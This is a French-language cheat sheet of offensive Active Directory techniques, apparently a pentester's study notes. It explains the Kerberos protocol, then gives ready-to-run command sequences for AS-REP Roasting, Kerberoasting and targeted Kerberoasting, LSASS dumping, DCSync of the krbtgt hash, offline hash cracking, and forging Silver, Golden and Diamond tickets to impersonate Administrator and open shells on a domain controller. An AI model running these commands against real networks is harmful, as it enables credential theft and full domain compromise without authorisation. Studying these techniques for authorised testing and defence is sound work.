# Théorie

Protocole par défaut depuis Windows Server 2003. Basé sur un système de **tickets** -  le client s'authentifie auprès du **KDC** (Key Distribution Center, rôle tenu par le DC), pas directement auprès du serveur applicatif.

![](../ActiveDirectory/img/Pasted%20image%2020260512145508.png)

| Acronyme | Signification                   |
| -------- | ------------------------------- |
| KDC      | Key Distribution Center         |
| TGT      | Ticket Granting Ticket          |
| AS-REQ   | Authentication Server Request   |
| AS-REP   | Authentication Server Reply     |
| TGS-REQ  | Ticket Granting Service Request |
| TGS-REP  | Ticket Granting Service Reply   |
| AP-REQ   | Application Request             |

**Phase 1 -  Authentification client (AS-REQ / AS-REP)**

1. Le client envoie un **AS-REQ** au DC : timestamp chiffré avec le hash du mot de passe
2. Le DC déchiffre avec le hash stocké dans `ntds.dit` -  si OK, renvoie un **AS-REP** contenant :
   - Une **session key** (chiffrée avec le hash du user)
   - Un **TGT** (Ticket Granting Ticket, chiffré avec le hash du compte `krbtgt` -  le client ne peut pas le lire)

> Le TGT est valide 10h par défaut et se renouvelle sans redemander le mot de passe.

**Phase 2 -  Accès à un service (TGS-REQ / TGS-REP)**

3. Le client envoie un **TGS-REQ** au KDC : username + timestamp chiffrés avec la session key + TGT + nom du service
4. Le KDC vérifie le TGT, extrait la session key, valide le timestamp et l'IP
5. Le KDC renvoie un **TGS-REP** contenant :
   - Un **service ticket** (chiffré avec le hash du compte de service)
   - Une nouvelle session key pour communiquer avec le service

**Phase 3 -  Authentification auprès du service (AP-REQ)**

6. Le client envoie un **AP-REQ** au serveur applicatif : username + timestamp chiffrés avec la session key + service ticket
7. Le serveur déchiffre le ticket avec son propre hash, vérifie le username, lit les groupes → accorde l'accès

| Ticket | Hash requis | Forgé offline | Scope | Usage offensif |
|---|---|---|---|---|
| **TGT normal** | Hash user (légitime) | Non | Tous les services | Overpass the Hash |
| **Silver Ticket** | Hash compte de service | Oui | Un seul service | Accès furtif, ne contacte pas le DC |
| **Golden Ticket** | Hash `krbtgt` | Oui | Tout le domaine | Persistence totale, impersonate n'importe quel user |

---
# AS-REP Roasting

> Attaque sur les étapes KRB_AS_REQ et KRB_AS_REP du protocole Kerberos  
Si un utilisateur possède l’attribut DONT_REQ_PREAUTH dans l’UAC  
Alors l’envoi du timestamp lors de KRB_AS_REQ n’est pas nécessaire  
N’importe qui peut forger une demande KRB_AS_REQ pour un utilisateur arbitraire

Si un compte AD a l'option **"Do not require Kerberos preauthentication"** activée, un attaquant peut demander un AS-REP sans s'authentifier → la réponse contient un hash crackable offline.

**Sans compte AD (liste de usernames requise)**

```bash
# nxc -  tester une liste de users sans mot de passe
nxc ldap 'IP_DC' -u users.txt -p '' --kdcHost 'IP_DC' --asreproast asreproast.txt 

# impacket -  même chose
impacket-GetNPUsers -dc-ip 'IP_DC' -no-pass -usersfile users.txt corp.com/ -outputfile hashes.asreproast
```

**Avec un compte AD**

```bash
# Kali -  énumère les users vulnérables ET récupère les hashes
impacket-GetNPUsers -dc-ip 'IP_DC' -outputfile hashes.asreproast corp.com/'USER':'PASSWORD'
```

```powershell
# Windows (PowerView) -  identifier les comptes vulnérables
Get-DomainUser -PreauthNotRequired
```

```powershell
# Windows (Rubeus) -  récupérer les hashes
.\Rubeus.exe asreproast /nowrap
```

**Cracker le hash (mode 18200)**

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

> **Targeted AS-REP Roasting** : si on a `GenericWrite` ou `GenericAll` sur un compte, on peut modifier son `UserAccountControl` pour désactiver la pré-authentification, récupérer le hash, puis remettre la valeur d'origine. En pratique, **Targeted Kerberoasting** est préféré pour le même prérequis -  il suffit d'ajouter un SPN sans toucher au `userAccountControl`.

---
# Kerberoasting

> Attaque sur l’étape **KRB\_TGS\_REP**\
> Nécessite un compte utilisateur sans privilèges particulier\
> Basé sur le mécanisme de ticket de service\
> N’importe quel utilisateur du domaine peut demander un ticket de service pour un compte possédant un SPN (Service Principal Name) à partir de son TGT\
> Le KDC va alors vérifier la validité du TGT en le déchiffrant et répondre avec un message KRB\_TGS\_REP dont une partie de la réponse est chiffrée avec le hash du compte de service.\
> La réponse peut être ensuite cassée hors-ligne.

Attaque sur l'étape **KRB_TGS_REP**. N'importe quel utilisateur du domaine (sans privilèges particuliers) peut demander un service ticket (TGS) pour n'importe quel compte possédant un SPN. Le KDC vérifie la validité du TGT mais **ne vérifie pas les permissions** de l'utilisateur sur le service. Il répond avec un TGS-REP dont une partie est chiffrée avec le hash du compte de service → crackable offline.

> Cible prioritaire : les comptes **utilisateur** avec un SPN (IIS, MSSQL…). Les comptes machine, MSA et gMSA ont des mots de passe aléatoires de 120 caractères -  inutile de les craquer. Même chose pour `krbtgt`.

**Depuis Kali -  nxc (avec un compte valide)**

```bash
nxc ldap 'IP_DC' -u 'USER' -p 'PASSWORD' --kdcHost 'IP_DC' --kerberoasting kerberoasting.txt
```

**Depuis Kali -  impacket**

```bash
impacket-GetUserSPNs -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD' -outputfile hashes.kerberoast
```

**Depuis Windows (Rubeus)**

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

> Erreur `KRB_AP_ERR_SKEW` → synchroniser l'heure avec le DC : `sudo ntpdate <IP_DC>`

**Cracker le hash (mode 13100)**

```bash
hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt
```

## Kerberoasting via AS-REP Roasting

Si on contrôle un compte AS-REP roastable (sans pré-auth), on peut l'utiliser pour kerberoaster d'autres comptes -  sans avoir besoin d'un vrai mot de passe.

**NetExec**
```bash
# -u : compte AS-REP roastable (pas de pré-auth requise)
# --no-preauth-targets : liste des comptes à kerberoaster
nxc ldap 'IP_DC' -u 'ASREP_USER' -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```

**impacket**
```bash
GetUserSPNs.py -no-preauth <ASREP_USER> -usersfile services.txt -dc-host <IP_DC> <DOMAIN>/
```

**Rubeus**
```powershell
.\Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:<DOMAIN> /dc:<DC_HOST> /nopreauth:<ASREP_USER> /spn:<TARGET_SERVICE>
```

## Targeted Kerberoasting

Requiert `GenericAll`, `GenericWrite`, `WriteProperty` ou `Validated-SPN` sur la cible. Les membres du groupe **Account Operators** ont généralement ces droits.

**Depuis Kali -  targetedKerberoast.py (recommandé, gère tout automatiquement)**

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
cd targetedKerberoast
targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p <PASSWORD>
```

**Depuis Kali - manuellement avec nxc**

```bash
sudo apt install bloodyad

# 1. Ajouter un SPN
bloodyAD -d <DOMAIN> --host <IP_DC> -u <USER> -p <PASSWORD> set object <TARGET> servicePrincipalName -v 'HTTP/ANYTHING'

# 2. Kerberoaster
nxc ldap 'IP_DC' -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --kerberoasting kerberoastables.txt

# 3. Cleanup
bloodyAD -d <DOMAIN> --host <IP_DC> -u <USER> -p <PASSWORD> remove object <TARGET> servicePrincipalName -v 'HTTP/ANYTHING'
```

**Depuis Windows - PowerView**

```powershell
# Vérifier que la cible n'a pas déjà un SPN
Get-DomainUser 'VICTIMUSER' | Select serviceprincipalname

# Ajouter un SPN
Set-DomainObject -Identity 'VICTIMUSER' -Set @{serviceprincipalname='NONEXISTENT/BLAHBLAH'}

# Récupérer le hash
$User = Get-DomainUser 'VICTIMUSER'
$User | Get-DomainSPNTicket | fl

# Cleanup
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```

> Toujours supprimer le SPN après exploitation pour ne pas laisser de vulnérabilité dans l'infra.

---
# Silver Tickets

Forger un service ticket (TGS) en utilisant le hash NTLM du compte de service. L'application cible vérifie le ticket localement (chiffré avec le hash du service) sans contacter le DC → accès avec les permissions de son choix.

> La validation PAC (optionnelle) est rarement activée sur les services -  l'attaque fonctionne dans la grande majorité des cas.

**Kali**

1. Dump lssas
```bash
nxc smb 192.168.1.10 -u 'USERNAME' -p 'PASSWORD' -M lsassy
```

Regarder si certains comptes ont des SPN
```bash
impacket-GetUserSPNs -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD'

nxc ldap 'IP_DC' -u 'USER' -p 'PASSWORD' --kerberoasting output.txt
```
2. Obtenir le Domain SID
```bash
impacket-lookupsid corp.com/'USERNAME':'PASSWORD'@192.168.1.10
```

```bash
nxc smb 192.168.1.10 -u 'USERNAME' -p 'PASSWORD' -x "whoami /user"
# ex: S-1-5-21-1987370270-658905905-1781884369-1105
# Domain SID = S-1-5-21-1987370270-658905905-1781884369 (sans le RID final)
```

3. Forger et injecter le Silver Ticket
```bash
impacket-ticketer -nthash 'SERVICE_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain corp.com -spn 'PROTOCOL'/'SPN_HOST'
# → génère <USERNAME>.ccache
```

4. Utiliser le ticket
```bash
export KRB5CCNAME=<USERNAME>.ccache

impacket-psexec -k -no-pass corp.com/'USERNAME'@'SPN_HOST' -dc-ip 'IP_DC' -target-ip 'IP_DC'
impacket-wmiexec -k -no-pass corp.com/'USERNAME'@'SPN_HOST' -dc-ip 'IP_DC' -target-ip 'IP_DC'

curl -k --negotiate -u : http://<SPN_HOST>
```

**Windows (Mimikatz)**

1. Dump lssas
```
privilege::debug
sekurlsa::logonpasswords
```

2. Obtenir le Domain SID
```powershell
whoami /user
# ex: S-1-5-21-1987370270-658905905-1781884369-1105
# Domain SID = S-1-5-21-1987370270-658905905-1781884369 (sans le RID final)
```

3. Forger et injecter le Silver Ticket
```
kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /target:<SPN_HOST> /service:<PROTOCOL> /rc4:<NTLM_HASH> /user:<USER> /ptt
```

```
# Exemple -  forger un ticket HTTP pour web04 en tant que jeffadmin
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin /ptt
```

> `/ptt` injecte directement le ticket en mémoire. Le module s'appelle `kerberos::golden` mais génère bien un **silver ticket** quand `/service` est spécifié (pas `krbtgt`).

4. Vérifier que le ticket est en mémoire**

```powershell
klist
```

5. Utiliser le ticket**

```powershell
iwr -UseDefaultCredentials http://web04

# Afficher le contenu complet de la page (source HTML)
(iwr -UseDefaultCredentials http://web04).Content
(iwr -UseDefaultCredentials http://web04).RawContent
```

> Patch Microsoft (octobre 2022) : le champ `PAC_REQUESTOR` doit être validé par le DC si client et KDC sont dans le même domaine -  empêche de forger des tickets pour des users inexistants, mais pas pour des users valides.

---
# Golden Ticket

Forge un TGT entièrement offline en utilisant le hash NTLM du compte **krbtgt**. Permet de s'attribuer n'importe quels groupes/privilèges (Domain Admins, etc.) pour n'importe quel compte existant. Le DC accepte le ticket car il est chiffré avec la bonne clé.

> Prérequis : avoir compromis le DC ou un compte DA pour extraire le hash krbtgt.
> Durée par défaut : **10 ans** (contrairement aux TGT légitimes à 10h).
> Utiliser le **hostname** et non l'IP pour forcer Kerberos -  avec l'IP, Windows bascule sur NTLM et l'accès est refusé.

**Linux**

1. Obtenir le hash krbtgt
```bash
# Depuis Kali via DCSync
impacket-secretsdump -just-dc-user krbtgt corp.com/'DA_USER':'PASSWORD'@'IP_DC'
# ou
nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds
# → noter le hash NTLM de krbtgt
```

2. Forger et injecter le Golden Ticket

```bash
# Obtenir le Domain SID ET le RID du compte cible en une seule commande
impacket-lookupsid corp.com/'USER':'PASSWORD'@'IP_DC'
# S-1-5-21-YYY-YYY-YYY-RID
# Enlever le RID et on obtient le domain-sid

# Forger le ticket (-user-id obligatoire sur Server 2022+)
impacket-ticketer -nthash 'KRBTGT_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain corp.com -user-id 'RID' 'USERNAME'
# → génère <USERNAME>.ccache

# Charger et utiliser
export KRB5CCNAME=<USERNAME>.ccache
impacket-psexec -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
impacket-wmiexec -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
```

**Windows (Mimikatz)**

```
# Purger les tickets existants
kerberos::purge

# Forger et injecter le Golden Ticket
kerberos::golden /user:<USER> /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

# Ouvrir un shell et utiliser (hostname obligatoire, pas IP)
misc::cmd
```

```cmd
PsExec.exe \\DC1 cmd.exe
```

# Diamond Tickets

Fonctionnellement, un diamond ticket n'est pas différent d'un TGT forgé - la différence est dans la manière dont il est créé. Un diamond ticket est créé en demandant un TGT légitime pour un utilisateur. Le secret du KDC est ensuite utilisé pour déchiffrer le ticket, où les informations internes (nom du principal, ID, groupes, etc.) peuvent être modifiées. Le ticket est ensuite re-chiffré et re-signé avec le secret du KDC.

L'avantage de cette technique est que toutes les informations périphériques du ticket sont parfaitement conformes à la politique du domaine. Un autre avantage est qu'elle rend la détection basée sur des AS-REQ manquants plus difficile.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
```

Où :
- `/tgtdeleg` utilise l'astuce de délégation du TGT ([TGT delegation trick](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#tgtdeleg)) pour obtenir un TGT utilisable pour l'utilisateur courant sans avoir besoin de credentials.
- `/krbkey` est le hash AES256 du compte krbtgt.
- `/ticketuser` est l'utilisateur que l'on veut usurper.
- `/ticketuserid` est le RID de l'utilisateur usurpé.
- `/domain` est le domaine courant.

La commande `describe` de Rubeus dispose d'un paramètre `/servicekey` qui déchiffre et affiche le PAC du ticket. En décrivant le premier ticket, on voit qu'il s'agit d'un TGT pour l'utilisateur courant (comme attendu).

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticket:doIFm[...snip...]kNPTQ==
```

Le ticket est ensuite déchiffré, modifié, puis re-chiffré. En décrivant le second ticket, on voit qu'il s'agit maintenant d'un TGT pour Administrator.

> Rubeus définit le champ Groups à 520,512,513,519,518 par défaut, mais on peut changer ça avec le paramètre `/groups`.

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticket:doIF7[...snip...]kNPTQ==
```

> On remarque que certains champs, comme le FullName, sont toujours ceux du TGT d'origine, ce qui peut constituer un point de détection potentiel.

```
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIF5[...snip...]5DT00=
```
